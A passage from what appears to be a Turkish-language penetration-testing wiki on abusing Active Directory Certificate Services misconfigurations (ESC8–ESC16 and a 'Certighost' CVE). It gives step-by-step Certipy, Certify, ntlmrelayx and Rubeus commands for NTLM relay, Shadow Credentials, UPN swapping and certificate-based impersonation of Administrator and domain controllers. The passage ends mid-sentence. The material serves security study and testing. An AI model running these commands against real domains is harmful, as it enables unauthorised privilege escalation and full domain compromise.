../printers-spooler-service-abuse.md
{{#endref}}

### **Abuse**

[**Certify**](https://github.com/GhostPack/Certify)'nin `cas` command'i **etkin HTTP AD CS endpoint'lerini** listeler:<sup>[[4]](#references)</sup>
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

`msPKI-Enrollment-Servers` özelliği, kurumsal Sertifika Yetkilileri (CA'lar) tarafından Sertifika Kayıt Hizmeti (CES) uç noktalarını depolamak için kullanılır. Bu uç noktalar, **Certutil.exe** aracı kullanılarak ayrıştırılıp listelenebilir:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Certify ile Abuse
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### [Certipy](https://github.com/ly4k/Certipy) ile Abuse

Sertifika isteği, varsayılan olarak Certipy tarafından `Machine` veya `User` template'i temel alınarak yapılır; seçim, relay edilen hesap adının `$` ile bitip bitmemesine göre belirlenir. Alternatif bir template belirtmek için `-template` parametresi kullanılabilir.

Daha sonra authentication'ı zorlamak için [PetitPotam](https://github.com/ly4k/PetitPotam) gibi bir teknik kullanılabilir. Domain controller'larla çalışırken `-template DomainController` belirtilmelidir.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Açıklama

**`msPKI-Enrollment-Flag`** için yeni **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) değeri (ESC9 olarak anılır), bir sertifikaya **yeni `szOID_NTDS_CA_SECURITY_EXT` security extension** eklenmesini engeller. Bu flag, varsayılan ayar olan `1` ile `2` arasındaki farkta, **`StrongCertificateBindingEnforcement`** değeri `1` olarak ayarlandığında önem kazanır. ESC9'un yokluğu gereksinimleri değiştirmeyeceğinden, daha zayıf bir certificate mapping'in Kerberos veya Schannel için istismar edilebildiği senaryolarda (ESC10'da olduğu gibi) önemi daha da artar.<sup>[[7]](#references)</sup>

Bu flag'in ayarlanmasının önem kazandığı koşullar şunlardır:

- `StrongCertificateBindingEnforcement` değeri `2` olarak ayarlanmamıştır (varsayılan değer `1`'dir) veya `CertificateMappingMethods`, `UPN` flag'ini içerir.
- Sertifika, `msPKI-Enrollment-Flag` ayarı içinde `CT_FLAG_NO_SECURITY_EXTENSION` flag'i ile işaretlenmiştir.
- Sertifika tarafından herhangi bir client authentication EKU'su belirtilmiştir.
- Başka bir hesabı ele geçirmek için herhangi bir hesap üzerinde `GenericWrite` izinleri mevcuttur.

### Kötüye Kullanım Senaryosu

`John@corp.local` kullanıcısının `Jane@corp.local` üzerinde `GenericWrite` izinlerine sahip olduğunu ve amacın `Administrator@corp.local` hesabını ele geçirmek olduğunu varsayalım. `Jane@corp.local` kullanıcısının enroll olmasına izin verilen `ESC9` certificate template'i, `msPKI-Enrollment-Flag` ayarında `CT_FLAG_NO_SECURITY_EXTENSION` flag'i ile yapılandırılmıştır.

İlk olarak, `John`'un `GenericWrite` izni sayesinde `Jane`'in hash'i Shadow Credentials kullanılarak elde edilir:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Ardından, `Jane`'in `userPrincipalName` değeri, `@corp.local` domain kısmı kasıtlı olarak çıkarılarak `Administrator` olarak değiştirilir:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Bu değişiklik, `Administrator@corp.local`, `Administrator` kullanıcısının `userPrincipalName` değeri olarak ayrı kaldığından kısıtları ihlal etmez.

Bunun ardından, savunmasız olarak işaretlenen `ESC9` certificate template'i `Jane` olarak istenir:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Sertifikanın `userPrincipalName` değerinin, herhangi bir “object SID” içermeden `Administrator` değerini yansıttığı görülür.

Ardından `Jane`'in `userPrincipalName` değeri, orijinal değeri olan `Jane@corp.local` olarak geri alınır:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Verilen sertifikayla kimlik doğrulama denenmesi artık `Administrator@corp.local` hesabının NT hash değerini verir. Sertifikada domain belirtimi bulunmadığından komut `-domain <domain>` içermelidir:
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
## Zayıf Sertifika Eşlemeleri - ESC10

### Açıklama

ESC10, domain controller üzerindeki iki registry key değerini ifade eder:

- `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` altındaki `CertificateMappingMethods` için varsayılan değer `0x18` (`0x8 | 0x10`) olup daha önce `0x1F` olarak ayarlanmıştır.
- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` altındaki `StrongCertificateBindingEnforcement` için varsayılan ayar `1` olup daha önce `0` olarak ayarlanmıştır.<sup>[[7]](#references)</sup>

**Durum 1**

`StrongCertificateBindingEnforcement` değeri `0` olarak yapılandırıldığında.

**Durum 2**

`CertificateMappingMethods`, `UPN` bitini (`0x4`) içerdiğinde.

### Kötüye Kullanım Durumu 1

`StrongCertificateBindingEnforcement` değeri `0` olarak yapılandırıldığında, `GenericWrite` izinlerine sahip bir A hesabı, herhangi bir B hesabını ele geçirmek için istismar edilebilir.

Örneğin, `Jane@corp.local` üzerinde `GenericWrite` izinlerine sahip olan saldırgan, `Administrator@corp.local` hesabını ele geçirmeyi hedefler. Prosedür ESC9'u taklit eder ve herhangi bir certificate template'in kullanılmasına olanak tanır.

İlk olarak, `GenericWrite` kullanılarak Shadow Credentials istismarı yoluyla `Jane` hesabının hash'i alınır.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Ardından, kısıtlama ihlalini önlemek amacıyla `Jane` kullanıcısının `userPrincipalName` değeri, `@corp.local` kısmı kasıtlı olarak atlanarak `Administrator` olarak değiştirilir.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Bunun ardından, varsayılan `User` template'i kullanılarak `Jane` adına istemci kimlik doğrulamasını etkinleştiren bir sertifika istenir.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`'in `userPrincipalName` değeri daha sonra özgün hali olan `Jane@corp.local` olarak geri döndürülür.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Elde edilen sertifikayla kimlik doğrulaması yapmak, `Administrator@corp.local` hesabının NT hash değerini verir; sertifikada domain bilgileri bulunmadığından komutta domain belirtilmesi gerekir.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Kötüye Kullanım Durumu 2

`CertificateMappingMethods`, `UPN` bit flag'ini (`0x4`) içerdiğinde, `GenericWrite` izinlerine sahip bir A hesabı, `userPrincipalName` özelliği bulunmayan tüm B hesaplarını, makine hesapları ve yerleşik etki alanı yöneticisi `Administrator` dahil olmak üzere compromise edebilir.

Buradaki amaç, `GenericWrite` yetkisinden yararlanarak önce Shadow Credentials aracılığıyla `Jane` hesabının hash'ini elde etmek ve ardından `DC$@corp.local` hesabını compromise etmektir.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane`'in `userPrincipalName` değeri daha sonra `DC$@corp.local` olarak ayarlanır.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
İstemci kimlik doğrulaması için varsayılan `User` şablonu kullanılarak `Jane` adına bir sertifika istenir.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`'in `userPrincipalName` değeri bu işlemden sonra orijinal haline döndürülür.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Schannel üzerinden kimlik doğrulamak için Certipy’nin `-ldap-shell` seçeneği kullanılır ve kimlik doğrulamanın `u:CORP\DC$` olarak başarılı olduğu görülür.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
LDAP shell üzerinden, `set_rbcd` gibi komutlar Resource-Based Constrained Delegation (RBCD) saldırılarını etkinleştirerek domain controller'ın ele geçirilmesini sağlayabilir.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Bu güvenlik açığı, `userPrincipalName` değerine sahip olmayan veya bu değer `sAMAccountName` ile eşleşmeyen tüm kullanıcı hesaplarını da etkiler. Varsayılan `Administrator@corp.local` hesabı, yükseltilmiş LDAP ayrıcalıkları ve varsayılan olarak `userPrincipalName` değerine sahip olmaması nedeniyle başlıca hedeftir.

## Relaying NTLM to ICPR - ESC11

### Açıklama

CA Server `IF_ENFORCEENCRYPTICERTREQUEST` ile yapılandırılmamışsa, RPC service üzerinden imzalama olmadan NTLM relay saldırıları gerçekleştirilebilir. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

`Enforce Encryption for Requests` seçeneğinin devre dışı olup olmadığını enumerate etmek için `certipy` kullanabilirsiniz. certipy, `ESC11` Vulnerabilities olduğunu gösterecektir.
```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Abuse Scenario

Bir relay sunucusu kurulması gerekir:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Not: Domain controller'lar için DomainController'da `-template` belirtmemiz gerekir.

Veya [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) kullanarak:
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## ADCS CA'ya YubiHSM ile Shell erişimi - ESC12

### Açıklama

Administrators, Certificate Authority'yi anahtarlarını "Yubico YubiHSM2" gibi harici bir cihazda depolayacak şekilde yapılandırabilir.

USB cihazı CA sunucusuna bir USB portu üzerinden bağlanmışsa veya CA sunucusunun sanal makine olması durumunda bir USB device server kullanılıyorsa, Key Storage Provider'ın YubiHSM'deki anahtarları oluşturup kullanabilmesi için bir kimlik doğrulama anahtarı (bazen "password" olarak adlandırılır) gerekir.

Bu anahtar/password, registry'de `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` altında cleartext olarak depolanır.

Referans [burada](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).<sup>[[11]](#references)</sup>

### Abuse Senaryosu

Shell access elde ettiğinizde CA'nın private key'i fiziksel bir USB cihazında depolanıyorsa, anahtarı kurtarmak mümkündür.

İlk olarak CA certificate'ını (bu public'tir) elde etmeniz, ardından şunları yapmanız gerekir:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Son olarak, CA sertifikasını ve özel anahtarını kullanarak yeni bir rastgele sertifika oluşturmak için `certutil -sign` komutunu kullanın.

## OID Group Link Abuse - ESC13

### Açıklama

`msPKI-Certificate-Policy` özniteliği, issuance policy'nin certificate template'e eklenmesini sağlar. Issuance policy'leri oluşturmaktan sorumlu `msPKI-Enterprise-Oid` nesneleri, PKI OID container'ın Configuration Naming Context'inde (CN=OID,CN=Public Key Services,CN=Services) keşfedilebilir. Bir policy, bu nesnenin `msDS-OIDToGroupLink` özniteliği kullanılarak bir AD grubuna bağlanabilir. Bu sayede sistem, certificate sunan bir kullanıcıyı sanki grubun üyesiymiş gibi yetkilendirebilir. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

Başka bir deyişle, bir user certificate enroll etme iznine sahip olduğunda ve certificate bir OID grubuna bağlı olduğunda, user bu grubun privilege'larını devralabilir.

OIDToGroupLink bulmak için [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) kullanın:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Kötüye Kullanım Senaryosu

`certipy find` veya `Certify.exe find /showAllPermissions` kullanarak yararlanabileceği bir kullanıcı izni bulun.

`John`, `VulnerableTemplate` üzerinde enroll iznine sahipse kullanıcı, `VulnerableGroup` grubunun ayrıcalıklarını devralabilir.

Yapması gereken tek şey template'i belirtmektir; OIDToGroupLink haklarına sahip bir certificate alacaktır.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Vulnerable Certificate Renewal Configuration- ESC14

### Açıklama

https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping adresindeki açıklama son derece kapsamlıdır. Aşağıda orijinal metinden bir alıntı bulunmaktadır.<sup>[[14]](#references)</sup>

ESC14, temel olarak Active Directory kullanıcı veya bilgisayar hesaplarındaki `altSecurityIdentities` attribute’unun kötüye kullanılması ya da güvenli olmayan şekilde yapılandırılması yoluyla ortaya çıkan "zayıf açık certificate mapping" güvenlik açıklarını ele alır. Çok değerli bu attribute, yöneticilerin kimlik doğrulama amacıyla X.509 certificate’larını bir AD hesabıyla manuel olarak ilişkilendirmesine olanak tanır. Bu açık eşleştirmeler yapılandırıldığında, genellikle certificate’ın SAN alanındaki UPN veya DNS adlarına ya da `szOID_NTDS_CA_SECURITY_EXT` security extension içinde yer alan SID’e dayanan varsayılan certificate mapping mantığını geçersiz kılabilir.

`altSecurityIdentities` attribute’u içinde bir certificate’ı tanımlamak için kullanılan string değeri çok geniş olduğunda, kolayca tahmin edilebildiğinde, benzersiz olmayan certificate alanlarına dayandığında veya kolayca taklit edilebilen certificate bileşenlerini kullandığında "zayıf" bir mapping oluşur. Bir attacker, ayrıcalıklı bir hesap için bu şekilde zayıf tanımlanmış açık mapping ile eşleşen bir certificate elde edebilir ya da oluşturabilirse, bu certificate’ı kullanarak söz konusu hesap olarak authenticate olabilir ve hesabı taklit edebilir.

Potansiyel olarak zayıf `altSecurityIdentities` mapping string örnekleri şunlardır:

- Yalnızca yaygın bir Subject Common Name (CN) üzerinden mapping: örneğin, `X509:<S>CN=SomeUser`. Bir attacker, bu CN ile daha az güvenli bir kaynaktan certificate elde edebilir.
- Belirli bir serial number veya subject key identifier gibi ek nitelikler olmadan, aşırı genel Issuer Distinguished Name (DN) veya Subject DN kullanılması: örneğin, `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Bir attacker’ın meşru olarak elde edebileceği veya forge edebileceği bir certificate içinde karşılayabileceği diğer öngörülebilir pattern’lerin ya da kriptografik olmayan identifier’ların kullanılması (bir CA compromise edildiyse veya ESC1’de olduğu gibi vulnerable bir template bulunduysa).

`altSecurityIdentities` attribute’u mapping için çeşitli formatları destekler. Örneğin:

- `X509:<I>IssuerDN<S>SubjectDN` (tam Issuer ve Subject DN ile mapping)
- `X509:<SKI>SubjectKeyIdentifier` (certificate’ın Subject Key Identifier extension değerine göre mapping)
- `X509:<SR>SerialNumberBackedByIssuerDN` (serial number üzerinden mapping; Issuer DN ile örtük olarak nitelendirilir) - bu standart bir format değildir; genellikle `<I>IssuerDN<SR>SerialNumber` kullanılır.
- `X509:<RFC822>EmailAddress` (SAN içindeki bir RFC822 adıyla, genellikle bir email adresiyle mapping)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (certificate’ın ham public key’inin SHA1 hash’i ile mapping - genellikle güçlüdür)

Bu mapping’lerin security seviyesi, mapping string içinde kullanılan certificate identifier’larının özgüllüğüne, benzersizliğine ve kriptografik gücüne büyük ölçüde bağlıdır. Domain Controller’larda güçlü certificate binding mode’ları etkin olsa bile (bunlar öncelikle SAN UPN/DNS ve SID extension’a dayanan implicit mapping’leri etkiler), hatalı yapılandırılmış bir `altSecurityIdentities` girdisi, mapping mantığının kendisi hatalı veya aşırı izin verici olduğunda impersonation için doğrudan bir yol oluşturabilir.
### Abuse Scenario

ESC14, Active Directory’de (AD), özellikle `altSecurityIdentities` attribute’unda bulunan **explicit certificate mapping** yapılandırmalarını hedefler. Bu attribute ayarlanmışsa (tasarım gereği veya yanlış yapılandırma sonucunda), attacker’lar mapping ile eşleşen certificate’ları sunarak hesapları impersonate edebilir.

#### Scenario A: Attacker `altSecurityIdentities` Üzerine Yazabilir

**Ön koşul**: Attacker’ın hedef hesabın `altSecurityIdentities` attribute’una write permission’ı veya aşağıdaki permission’lardan biri aracılığıyla bu izni verme yetkisi vardır:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.
#### Scenario B: Hedefte X509RFC822 (Email) Üzerinden Zayıf Mapping Var

- **Ön koşul**: Hedefte `altSecurityIdentities` içinde zayıf bir X509RFC822 mapping bulunur. Bir attacker, victim’ın mail attribute’unu hedefin X509RFC822 adıyla eşleşecek şekilde ayarlayabilir, victim olarak bir certificate enroll edebilir ve bu certificate’ı hedef olarak authenticate olmak için kullanabilir.
#### Scenario C: Hedefte X509IssuerSubject Mapping Var

- **Ön koşul**: Hedefte `altSecurityIdentities` içinde zayıf bir X509IssuerSubject explicit mapping bulunur. Attacker, victim principal üzerindeki `cn` veya `dNSHostName` attribute’unu hedefin X509IssuerSubject mapping’inin subject’iyle eşleşecek şekilde ayarlayabilir. Ardından attacker, victim olarak bir certificate enroll edebilir ve bu certificate’ı hedef olarak authenticate olmak için kullanabilir.
#### Scenario D: Hedefte X509SubjectOnly Mapping Var

- **Ön koşul**: Hedefte `altSecurityIdentities` içinde zayıf bir X509SubjectOnly explicit mapping bulunur. Attacker, victim principal üzerindeki `cn` veya `dNSHostName` attribute’unu hedefin X509SubjectOnly mapping’inin subject’iyle eşleşecek şekilde ayarlayabilir. Ardından attacker, victim olarak bir certificate enroll edebilir ve bu certificate’ı hedef olarak authenticate olmak için kullanabilir.
### Somut işlemler
#### Scenario A

`Machine` certificate template’inden bir certificate request edin
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Sertifikayı kaydedin ve dönüştürün
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Kimlik doğrulama yapın (sertifikayı kullanarak)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Temizleme (isteğe bağlı)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
Daha spesifik attack yöntemleri ve çeşitli attack senaryoları için lütfen şu kaynağa başvurun: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Açıklama

https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc adresindeki açıklama oldukça kapsamlıdır. Aşağıda orijinal metinden bir alıntı yer almaktadır.<sup>[[15]](#references)</sup>

Yerleşik varsayılan sürüm 1 certificate template'leri kullanılarak bir saldırgan, template içinde belirtilen yapılandırılmış Extended Key Usage özniteliklerine kıyasla öncelikli olacak application policies içerecek şekilde bir CSR oluşturabilir. Tek gereksinim enrollment haklarıdır ve bu yöntem, **_WebServer_** template'ini kullanarak client authentication, certificate request agent ve codesigning certificate'leri oluşturmak için kullanılabilir.

### Kötüye Kullanım

[Certipy privilege-escalation documentation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu), daha ayrıntılı kullanım örnekleri içerir.<sup>[[14]](#references)</sup>


Certipy'nin `find` komutu, CA patch uygulanmamışsa ESC15'e karşı potansiyel olarak savunmasız V1 template'lerini belirlemeye yardımcı olabilir.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Scenario A: Direct Impersonation via Schannel

**Step 1: "Client Authentication" Application Policy ve hedef UPN'i enjekte ederek bir sertifika isteyin.** Saldırgan `attacker@corp.local`, kayıt sahibi tarafından sağlanan subject özelliğine izin veren "WebServer" V1 template'ini kullanarak `administrator@corp.local` hesabını hedefler.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: "Enrollee supplies subject" özelliğine sahip güvenlik açığı bulunan V1 template'i.
- `-application-policies 'Client Authentication'`: CSR'nin Application Policies extension'ına `1.3.6.1.5.5.7.3.2` OID'sini enjekte eder.
- `-upn 'administrator@corp.local'`: Impersonation için SAN'daki UPN'yi ayarlar.

**Step 2: Elde edilen certificate'ı kullanarak Schannel (LDAPS) üzerinden authenticate olun.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Senaryo B: Enrollment Agent Abuse üzerinden PKINIT/Kerberos Impersonation

**Adım 1: "Enrollee supplies subject" özelliğine sahip bir V1 template üzerinden, "Certificate Request Agent" Application Policy enjekte ederek bir certificate isteyin.** Bu certificate, attacker'ın (`attacker@corp.local`) bir enrollment agent olmasını sağlar. Burada attacker'ın kendi kimliği için herhangi bir UPN belirtilmez; amaç agent yeteneğini elde etmektir.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: OID `1.3.6.1.4.1.311.20.2.1` ekler.

**Adım 2: Hedef yetkili kullanıcı adına sertifika istemek için "agent" sertifikasını kullanın.** Bu, 1. Adım'daki sertifikayı agent sertifikası olarak kullanan ESC3 benzeri bir adımdır.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**3. Adım: "on-behalf-of" sertifikasını kullanarak ayrıcalıklı kullanıcı olarak kimlik doğrulaması yapın.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## CA üzerinde Güvenlik Uzantısı Devre Dışı (Genel)-ESC16

### Açıklama

**ESC16 (Eksik szOID_NTDS_CA_SECURITY_EXT Uzantısı üzerinden Yetki Yükseltme)**, AD CS yapılandırmasının **szOID_NTDS_CA_SECURITY_EXT** uzantısının tüm sertifikalara eklenmesini zorunlu kılmaması durumunu ifade eder. Bu durumda saldırgan şunları gerçekleştirebilir:

1. **SID binding olmadan** bir sertifika istemek.

2. Bu sertifikayı **herhangi bir hesap olarak kimlik doğrulamak** için kullanmak; örneğin yüksek ayrıcalıklı bir hesabı (ör. Domain Administrator) taklit etmek.

Ayrıntılı prensip hakkında daha fazla bilgi edinmek için şu makaleye de başvurabilirsiniz:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### Kötüye Kullanım

Aşağıdaki bilgiler [bu bağlantıda](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally) referans alınmıştır. Daha ayrıntılı kullanım yöntemlerini görmek için tıklayın.<sup>[[14]](#references)</sup>

Active Directory Certificate Services (AD CS) ortamının **ESC16**'ya karşı savunmasız olup olmadığını belirlemek için
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Adım 1: Kurban hesabının başlangıç UPN'sini okuyun (İsteğe bağlı - geri yükleme için).**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Adım 2: Mağdur hesabın UPN'sini hedef yöneticinin `sAMAccountName` değeriyle güncelleyin.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Adım 3: (Gerekirse) "victim" hesabı için kimlik bilgilerini edinin (ör. Shadow Credentials aracılığıyla).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Adım 4: ESC16'ya karşı savunmasız CA üzerinde _uygun herhangi bir istemci kimlik doğrulama şablonundan_ (ör. "User") "victim" kullanıcı olarak bir sertifika isteyin.** CA, ESC16'ya karşı savunmasız olduğundan, şablonun bu uzantıya ilişkin özel ayarlarından bağımsız olarak, verilen sertifikadaki SID security extension'ı otomatik olarak çıkarır. Kerberos credential cache ortam değişkenini ayarlayın (shell command):
```bash
export KRB5CCNAME=victim.ccache
```
Ardından sertifikayı talep edin:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**5. Adım: "victim" hesabının UPN'sini eski haline döndürün.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Adım 6: Hedef yöneticisi olarak kimlik doğrulaması yapın.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Rogue LDAP/LSA chase callback identity substitution (Certighost / CVE-2026-54121)

### Açıklama

**Certighost**, CA'nın verilen sertifikaya yerleştirilmesi gereken kimliği çözümlemek için istekte bulunan tarafından sağlanan istek özniteliklerine güvendiği bir **AD CS enrollment chase / callback path** mekanizmasını kötüye kullanır. Public PoC'de oluşturulan istek şunları içerir:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: CA'nın bağlantı kuracağı saldırgan kontrollü host/IP
- **`rmd`**: Taklit edilecek **target Domain Controller DNS name**

CA bu chase işlemini izlerse, **SMB/LSA (`445`)** ve **LDAP (`389`)** üzerinden saldırgana bağlanır. Saldırgan, callback oturumunun geçerli bir domain principal olarak kimlik doğrulaması yapması için **real machine account** kullanır (bu hesap genellikle varsayılan **`ms-DS-MachineAccountQuota`** aracılığıyla oluşturulur); ancak rogue services bunun yerine **target DC**'nin kimlik özniteliklerini döndürür:

